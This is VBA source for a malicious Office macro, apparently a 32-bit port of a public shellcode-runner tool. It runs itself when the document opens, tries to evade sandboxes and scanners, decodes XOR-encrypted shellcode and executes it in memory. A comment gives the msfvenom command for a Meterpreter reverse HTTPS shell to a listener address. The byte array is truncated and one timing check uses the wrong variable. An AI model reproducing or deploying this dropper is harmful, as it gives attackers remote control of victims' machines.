' 32-bit version of https://arttoolkit.github.io/wadcoms/ShellcodeRunner-VBA/
' Converted to 32-bit by https://github.com/beauknowstech
Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As Long, ByRef sSource As Any, ByVal lLength As Long) As Long
Private Declare Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As Long
Private Declare Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare Function FlsAlloc Lib "kernel32" (ByVal lpCallback As Long) As Long

Sub Document_Open()
    ShellcodeRunner
End Sub

Sub AutoOpen()
    ShellcodeRunner
End Sub

Function ShellcodeRunner()
    Dim buf As Variant
    Dim tmp As Long
    Dim addr As Long
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim dream As Integer
    Dim before As Date
    Dim t As Date

    ' Check if we're in a sandbox by calling a rarely emulated API
    If IsNull(FlsAlloc(tmp)) Then
        Exit Function
    End If

    ' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
    dream = Int((1500 * Rnd) + 2000)
    before = Now()
    Sleep (dream)
    If DateDiff("s", t, Now()) < dream Then
        Exit Function
    End If

    ' msfvenom -p windows/meterpreter/reverse_https LHOST=172.16.240.178 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key a
    buf = Array(157, 137, 238, 97, 97, 97, 1, 80, ...)

    ' XOR-decrypt the shellcode
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor Asc("a")
    Next i

    ' &H3000 = MEM_COMMIT | MEM_RESERVE
    ' &H40 = PAGE_EXECUTE_READWRITE
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function
